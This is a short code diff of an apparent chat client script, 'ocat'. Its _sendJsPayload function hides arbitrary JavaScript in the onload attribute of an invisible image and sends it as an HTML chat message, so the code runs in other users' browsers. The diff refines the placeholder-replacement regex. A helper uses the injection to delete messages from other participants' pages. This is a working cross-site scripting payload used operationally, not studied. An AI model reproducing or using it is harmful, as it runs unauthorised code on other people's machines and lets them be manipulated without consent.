@@ -417,11 +417,11 @@ var ocat = {
 	_sendJsPayload(code) {
 		code += ";this.parentElement.remove();";
 		var img = document.createElement("img");
-		img.src = "<SRC_HERE>";
+		img.src = "__OCAT_IMAGE_SRC_GOES_HERE__";
 		img.setAttribute("onload", code);
 		img.style.width = 0;
 		img.style.height = 0;
-		socket.emit("html-message", img.outerHTML.replace(img.src, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGBkZAAAAAoAAx9k7/gAAAAASUVORK5CYII="));
+		socket.emit("html-message", img.outerHTML.replace(/(src\s*=\s*(['"]?)).*?__OCAT_IMAGE_SRC_GOES_HERE__\2/, "$1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdjYGBkZAAAAAoAAx9k7/gAAAAASUVORK5CYII=$2"));
 	},
 	_deleteMessage(id) {
 		this._sendJsPayload(`document.querySelector('#message-container > div[data-message-id="${id}"]').remove();`);
